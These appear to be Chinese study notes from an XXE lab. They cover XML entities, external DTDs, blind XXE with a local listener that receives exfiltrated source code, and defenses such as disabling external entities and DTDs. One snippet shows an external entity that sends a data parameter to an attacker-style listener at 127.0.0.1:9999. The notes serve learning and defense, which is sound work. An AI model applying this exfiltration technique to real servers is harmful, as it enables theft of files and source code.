- xxe是怎么产生的：攻击者控制了xml输入，通过xml解析器开启了外部实体解析功能

# xml部分：

- xml是什么：xml是一种解释器，将字符串转化为程序可认识的数据
- xml存在特定的解析规则，DTD可以定义xml里面必须存放的内容，但是没有DTD存在，xml解析器依旧可以执行
- 实体：
  1. 实体：可以用于实体的替换，以&标记，而参数实体以%标记。参数实体在盲xxe中使用
  2. 外部实体：数据来自于外部资源

# 靶场实操部分：

1. 通过提交<user><name>admin</name></user>简答验证了实体基础部分
2. 通过以下内容进行测试实体替换

```php
    <?xml version="1.0"?>
    <!DOCTYPE user[
        <!ENTITY name "admin"> 实体的定义
    ] >
    <user>
        <name>&name;</name> 通过实体替换进行访问内容
    </user>
```

3. 但通过基础实体替换不能进行访问php文件，因为php文件中的部分特殊符号导致了xml解析器的语法错误，读取php文件内容涉及到伪协议
4. 攻击者控制的xml数据，xml解释器执行
5. 在涉及盲注的内容里，进行了小型监听器的搭建，用于当作攻击者服务器进行接收来自被害网站的代码。（这里的监听器搭建本质上是建立了一个小型php服务器，会记录访问这个服务器时，浏览器所带上的参数内容。在盲注实操中，我们通过外部xml进行拼接了url，使服务器带上源码参数进行访问了我们攻击者的服务器，导致的源码外泄）

- xxe与ssrf很相像的一点在于，攻击者没有自己去访问目标，而是控制了服务器代替自己发起请求。xxe中，服务器被控制去访问外部资源，ssrf中，服务器被控制去访问了内部的服务。

## 盲注：

- 盲注的思想是通过外部DTD，将读取的文件编码发送到攻击者的接收器内部

1. payload的构建：
   - 涉及到参数实体以及外部DTD
   - 外部DTD：对于实体的定义，不能在实体定义过程进行调用另一个实体，所以用到外部DTD进行定义实体，见evil.dtd文件。file参数实体的作用，读取目标文件，并进行编码。send参数实体作用更多是展开file。
   - 构建xml：见xxe1.php注释内容
2. 监听器搭建：在cmd中搭建一个小型简易的监听器
3. 易错点：在构造实体的时候，直接将文件名赋值给data，应该是将文件内容赋值给data，让服务器带着数据去访问以下的地址，而不是带着文件名

```php
<?xml version="1.0"?>

<!DOCTYPE user[
    <!ENTITY xxe SYSTEM "http://127.0.0.1:9999/?data=test.txt">
]>

<user>
    <name>&xxe;</name>
</user>
```

# 防御方式：

- 围绕限制xml数据和限制外部实体解析的核心展开

1. 关闭外部实体解析，切断xml解析器对外部资源的访问
2. 禁止DTD，XXE的最大问题来自于DTD，因为实体的定义都在于DTD中，限制实体的定义从根本上能解决很大一部分问题（不推荐输入过滤的方法，因为输入过滤很大可能被绕过）
3. 限制服务器的访问能力
